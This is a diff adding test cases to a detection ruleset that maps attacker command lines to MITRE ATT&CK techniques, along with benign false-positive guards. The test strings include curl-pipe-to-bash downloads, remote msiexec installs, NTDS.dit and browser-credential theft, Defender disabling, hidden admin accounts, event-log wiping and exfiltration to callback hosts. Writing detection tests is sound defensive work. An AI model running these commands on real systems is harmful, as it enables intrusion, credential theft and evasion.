@@ -98,6 +98,55 @@ describe("tradecraftRules — strong (High) attacker tradecraft", () => {
   });
 });
 
+describe("tradecraftRules — Huntress Rapid Response corpus additions", () => {
+  it("flags registry-based Defender/firewall service disable (Start=4), distinct from net/sc stop", () => {
+    expect(sig('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\mpssvc" /v Start /t REG_DWORD /d 4 /f')?.mitre).toContain("T1562.001");
+    expect(sig("SystemSettingsAdminFlows.exe Defender DisableEnhancedNotifications 1")?.mitre).toContain("T1562.001");
+  });
+
+  it("flags msiexec remote silent install and curl|bash fetch-execute", () => {
+    const r = sig("cmd.exe /c msiexec /q /i http://4.216.93.211:5981/RuntimeBroker.msi");
+    expect(r?.weight).toBe("strong");
+    expect(r?.mitre).toEqual(expect.arrayContaining(["T1105", "T1218.007"]));
+    expect(sig("curl -s hxxp://keep.camdvr.org:8000/d5.sh | bash")?.mitre).toEqual(expect.arrayContaining(["T1105", "T1059.004"]));
+    expect(sig("wget -qO- http://x.tld/i.sh | sudo sh")?.mitre).toContain("T1105");
+  });
+
+  it("flags NTDS.dit exfil via wbadmin backup and manual browser-credential-file copy", () => {
+    expect(sig("wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:C:\\windows\\NTDS\\ntds.dit -quiet")?.mitre).toContain("T1003.003");
+    expect(sig('copy "C:\\Users\\bob\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data" C:\\Windows\\Temp\\')?.mitre).toContain("T1555.003");
+  });
+
+  it("flags persistence: malicious sc-created service, hidden account, privileged-group add, chattr +i, bulk EventLog wipe", () => {
+    expect(sig('sc create windowDefenSrv binPath= "c:\\users\\public\\86.dat windowDefenSrv" start= auto')?.mitre).toContain("T1543.003");
+    expect(sig('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v backup_da /d 0 /f')?.mitre).toContain("T1564.002");
+    expect(sig('net group "Domain Admins" azuresync /add')?.mitre).toContain("T1098.007");
+    expect(sig('net localgroup Administrators evilacct /add')?.mitre).toContain("T1098.007");
+    expect(sig("chattr +i /usr/bin/sshd-agent")?.mitre).toContain("T1222.002");
+    expect(sig('powershell.exe [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName)')?.mitre).toContain("T1070.001");
+  });
+
+  it("flags the QEMU SSH-backdoor persistence/tunnel primitive", () => {
+    expect(sig("qemu-system-x86_64.exe -m 512 -nic user,hostfwd=tcp::22022-:22")?.mitre).toContain("T1572");
+  });
+
+  it("flags OOB-callback / BitTorrent-DHT / Cloudflare-Workers infrastructure as weak C2", () => {
+    expect(sig("iwr -Uri http://webhook.site/abc123 -Body $r -Method Put")?.mitre).toContain("T1071.001");
+    expect(sig("powershell Invoke-WebRequest -Uri http://x.oastify.com/y")?.mitre).toContain("T1071.001");
+    expect(sig("auth.qgtxtebl.workers.dev")?.mitre).toContain("T1572");
+    expect(sig("connecting to router.bittorrent.com for DHT bootstrap")?.mitre).toContain("T1090");
+  });
+
+  it("flags Elastic-Cloud-ingest exfil and InternetExplorer.Application COM proxy execution", () => {
+    expect(sig("Invoke-RestMethod -Uri https://my-deployment.es.us-east-1.aws.elastic-cloud.com:9243/_bulk -Method Post -Body $data")?.mitre).toContain("T1041");
+    expect(sig('$ie = New-Object -ComObject "InternetExplorer.Application"')?.mitre).toContain("T1559.001");
+  });
+
+  it("folds Akira's -dellog flag into the ransomware-encryptor rule", () => {
+    expect(sig("w.exe -n=3 -p=X:\\ -dellog")?.mitre).toContain("T1486");
+  });
+});
+
 describe("tradecraftRules — weak (Medium) dual-use tooling", () => {
   it("grades RMM, C2-framework names, ngrok/cloudflared as weak", () => {
     expect(sig("C:\\Windows\\Temp\\SplashtopStreamer3500.exe")?.weight).toBe("weak");
@@ -125,6 +174,15 @@ describe("tradecraftRules — false-positive guards (must NOT flag benign admin 
       "sc query WinDefend",                       // status query, not stop/config
       "bcdedit /enum",
       "tar -czf backup.tgz /data",
+      "msiexec /i C:\\Installers\\app.msi /qn",          // local install, no remote URL
+      "curl -s https://example.com/README.md",           // plain fetch, no pipe-to-shell
+      "sc create MyLegitSvc binPath= \"C:\\Program Files\\App\\svc.exe\"", // not staged in a user-writable dir
+      "net localgroup Backup-Operators bob /add",        // not a privileged group
+      "reg add HKLM\\SOFTWARE\\Contoso\\App /v Setting /d 1 /f",
+      "chmod 750 /usr/bin/sshd-agent",                    // permission change, not immutable flag
+      "Get-WinEvent -LogName Security -MaxEvents 10",     // reading logs, not clearing them
+      "qemu-system-x86_64.exe -m 2048 -hda disk.img",     // normal VM boot, no hostfwd backdoor
+      "Invoke-RestMethod -Uri https://api.contoso.com/status", // plain API GET, not upload/exfil
     ]) {
       expect(sig(cmd), cmd).toBeNull();
     }
